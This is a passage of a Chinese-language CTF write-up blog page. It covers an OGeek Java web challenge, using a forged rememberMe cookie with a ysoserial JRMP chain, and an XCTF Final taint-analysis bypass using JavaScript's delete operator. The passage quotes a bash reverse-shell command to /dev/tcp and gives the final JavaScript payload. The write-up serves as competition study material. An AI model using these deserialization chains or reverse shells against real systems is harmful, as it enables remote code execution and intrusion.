class="string">"wR&amp;_(NVG#c&amp;9(CDhaDMZELDmxSe(mwbB"</span></span><br><span class="line">k = md5(key.encode()).hexdigest()</span><br><span class="line">k = sha1(k.encode()).hexdigest().encode()</span><br><span class="line"></span><br><span class="line">newdata = bytearray()</span><br><span class="line">newdata_2 = bytearray()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    newdata.append(i)</span><br><span class="line">    newdata.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(newdata)):</span><br><span class="line">    newdata_2.append(newdata[i] ^ k[i % len(k)])</span><br><span class="line"></span><br><span class="line">print(b64encode(newdata_2))</span><br></pre></td></tr></table></figure>
+
+<p>然后直接改到 rememberMe 的 Cookie 上就行了, 尝试了几个 payload 因为 Cookie 是有长度限制的, 平常是直接将序列化数据 base64 贴上去所以不会超出限制. 这里双重 base64 加上加密还得带一个 xor key 导致很多 payload 就不能直接用了. 所以我们这里还是用 JRMPClient 来中转一下, 在自己的机器上跑一个 ysoserial.exploit.JRMPListener 就 ok 了.</p>
+<p>这里需要注意原版的 ysoserial 是直接用的 <code>java.Runtime.getRuntime().exec(payload)</code>, 相当于 <code>execv(payload.split(&#39; &#39;))</code>, 会导致 <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.19.3/7777 0&gt;&amp;1&quot;</code> 之类的不能用, 这里当时是用了别的命令利用的漏洞. 赛后 fork 了 <a href="https://github.com/rmb122/ysoserial" target="_blank" rel="noopener">ysoserial</a> 改了下, 用的 <code>java.Runtime.getRuntime().exec(new String[]{})</code> 就能直接弹 shell 之类的.</p>
+<h2 id="XCTF-Final-babytaint-Writeup"><a href="#XCTF-Final-babytaint-Writeup" class="headerlink" title="XCTF Final babytaint Writeup"></a>XCTF Final babytaint Writeup</h2><p>拿到手先 Google <code>jalangi2</code> 是个啥, 可以搜到是个可以 hook javascript 各种操作的库. 这里是拿来搞了污点分析.<br>如果之前了解过一些编译原理和 PHP 的 taint 拓展, 那这道题确实挺简单的. 本质就是从 /dev/urandom/ 里面获取随机字节作为 secret, 题目 hook 了 “Source”() 的调用, 返回了 taint 过的 secret, 你需要通过某种方法 bypass 掉这个 taint. 也就是将污点去除.<br>我们看一下源码, 关键就是这个</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AnnotatedValue</span>(<span class="params">val, shadow</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.val = val;</span><br><span class="line">		<span class="keyword">this</span>.shadow = shadow;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>这个就是一个包装类, 用 shadow 来记录是否是 taint 过的值. 题目 hook 住了所有计算, 拿二元计算来看</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.binary = <span class="function"><span class="keyword">function</span>(<span class="params">iid, op, left, right, result</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">const</span> aleft = actual(left);</span><br><span class="line">		<span class="keyword">const</span> aright = actual(right);</span><br><span class="line">		<span class="keyword">switch</span> (op)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"+"</span>:</span><br><span class="line">			result = aleft + aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"-"</span>:</span><br><span class="line">			result = aleft - aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"*"</span>:</span><br><span class="line">			result = aleft * aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"/"</span>:</span><br><span class="line">			result = aleft / aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"%"</span>:</span><br><span class="line">			result = aleft % aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&lt;&lt;"</span>:</span><br><span class="line">			result = aleft &lt;&lt; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&gt;&gt;"</span>:</span><br><span class="line">			result = aleft &gt;&gt; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&gt;&gt;&gt;"</span>:</span><br><span class="line">			result = aleft &gt;&gt;&gt; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&lt;"</span>:</span><br><span class="line">			result = aleft &lt; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&gt;"</span>:</span><br><span class="line">			result = aleft &gt; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&lt;="</span>:</span><br><span class="line">			result = aleft &lt;= aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&gt;="</span>:</span><br><span class="line">			result = aleft &gt;= aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"=="</span>:</span><br><span class="line">			result = aleft == aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"!="</span>:</span><br><span class="line">			result = aleft != aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"==="</span>:</span><br><span class="line">			result = aleft === aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"!=="</span>:</span><br><span class="line">			result = aleft !== aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"&amp;"</span>:</span><br><span class="line">			result = aleft &amp; aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"|"</span>:</span><br><span class="line">			result = aleft | aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"^"</span>:</span><br><span class="line">			result = aleft ^ aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"delete"</span>:</span><br><span class="line">			result = <span class="keyword">delete</span> aleft[aright];</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"instanceof"</span>:</span><br><span class="line">			result = aleft <span class="keyword">instanceof</span> aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"in"</span>:</span><br><span class="line">			result = aleft <span class="keyword">in</span> aright;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			errExit(op + <span class="string">" at "</span> + iid + <span class="string">" not found"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> &#123;<span class="attr">result</span>: <span class="keyword">new</span> AnnotatedValue(result,</span><br><span class="line">			shadow(left) || shadow(right))&#125;;</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
+<p>只要两个运算符有一个是 taint 过的, 返回的也是 taint 过的值. 同时我们想要拿到 flag, 需要调用 “Sink”(secret), 但是输入的 secret  </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (f === <span class="string">"Sink"</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (shadow(args[<span class="number">0</span>]))</span><br><span class="line">			&#123;</span><br><span class="line">				errExit(<span class="string">"Value passed into sink cannot be tained"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">const</span> arr = actual(args[<span class="number">0</span>])</span><br><span class="line">			<span class="keyword">if</span> (!(arr <span class="keyword">instanceof</span> <span class="built_in">Array</span>) || arr.length !== <span class="number">0x10</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				errExit(<span class="string">"must use an array with length 16 as the key"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (shadow(arr[i])) <span class="comment">// check here</span></span><br><span class="line">				&#123;</span><br><span class="line">					errExit(<span class="string">"Value passed into sink cannot be tained"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (actual(arr[i]) !== secret[i])</span><br><span class="line">				&#123;</span><br><span class="line">					errExit(<span class="string">"Wrong key!"</span>)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">console</span>.log(<span class="built_in">String</span>(fs.readFileSync(<span class="string">"flag"</span>)));</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也不能是被 train 过的, 这就需要一点技巧来 bypass, 这里我用的是 delete 这个操作符, 因为 delete 影响的是左值对象的本身. 而这里 hook 的时候并不会将左值给 taint 掉, 只会将返回值 undefined 给 taint.<br>我们可以搞一个大小 256 的数组, 将 secret 作为删除的 key, 然后遍历找到是哪个 key 被 delete 掉, 我们就能获得 secret 的值而不被 taint.<br>最后 payload 如下:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key=[];a=[]; <span class="keyword">for</span> (z=<span class="number">0</span>;z&lt;<span class="number">16</span>;z++)&#123;<span class="keyword">for</span> (i = <span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;a[i]=<span class="number">0</span>;&#125;;t=<span class="string">"Source"</span>();<span class="keyword">delete</span> a[t[z]];<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;<span class="keyword">if</span> (a[i] === <span class="literal">undefined</span>)&#123;key[z]=i;&#125;&#125;&#125;;<span class="string">"Sink"</span>(key);</span><br></pre></td></tr></table></figure>
+<p>可以看到不是很复杂, 这道题好像也有很多队伍做出来 233</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>rmb122
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://rmb122.com/2019/10/31/OGeek-%E7%BA%BF%E4%B8%8B-Java-Web-And-XCTF-Final-babytaint-Writeup/" title="OGeek 线下 Java Web And XCTF Final babytaint Writeup">https://rmb122.com/2019/10/31/OGeek-线下-Java-Web-And-XCTF-Final-babytaint-Writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章仅仅记录学习过程, 并不保证文章完全正确, 如果你有任何疑问或者找出问题, 欢迎在评论区指正.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/08/28/Ogeek-Easy-Realworld-Challenge-1-2-Writeup/" rel="prev" title="Ogeek Easy Realworld Challenge 1&2 Writeup">
+      <i class="fa fa-chevron-left"></i> Ogeek Easy Realworld Challenge 1&2 Writeup
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/01/13/2019-%E9%AB%98%E6%A0%A1%E8%BF%90%E7%BB%B4-ezcms-%E5%A4%8D%E7%8E%B0/" rel="next" title="2019 高校运维 ezcms 复现">
+      2019 高校运维 ezcms 复现 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Java-Web"><span class="nav-number">1.</span> <span class="nav-text">Java Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XCTF-Final-babytaint-Writeup"><span class="nav-number">2.</span> <span class="nav-text">XCTF Final babytaint Writeup</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rmb122"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">rmb122</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/rmb122" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;rmb122" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rmb122</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+<script>
+  (function() {
+    function leancloudSelector(url) {
+      url = encodeURI(url);
+      return document.getElementById(url).querySelector('.leancloud-visitors-count');
+    }
+
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.id);
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            leancloudSelector(url).innerText = counter.time + 1;
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              });
+          } else {
+              leancloudSelector(url).innerText = 'Counter not initialized! More info at console err msg.';
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.id);
+      });
+
+      Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({ url: { '$in': entries } })))
+        .then(response => response.json())
+        .then(({ results }) => {
+          for (let url of entries) {
+            let target = results.find(item => item.url === url);
+            leancloudSelector(url).innerText = target ? target.time : 0;
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+
+    let { app_id, app_key, server_url } = {"enable":true,"app_id":"rVVd10sU0t2cjpEvSiQh7av7-MdYXbMMI","app_key":"Y31jyHHMWPckrz1X8Fn9EUi0","server_url":null,"security":true};
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : app_id,
+            'X-LC-Key'    : app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    }
+
+    let api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${app_id.slice(0, 8).toLowerCase()}.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(response => response.json())
+        .then(({ api_server }) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    new Valine(Object.assign({
+      el         : '#valine-comments',
+      path       : location.pathname,
+    }, {"enable":true,"appId":"rVVd10sU0t2cjpEvSiQh7av7-MdYXbMMI","appKey":"Y31jyHHMWPckrz1X8Fn9EUi0","notify":false,"verify":true,"placeholder":"Write something here","avatar":"retro","meta":["nick","mail"],"pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null}
+    ));
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
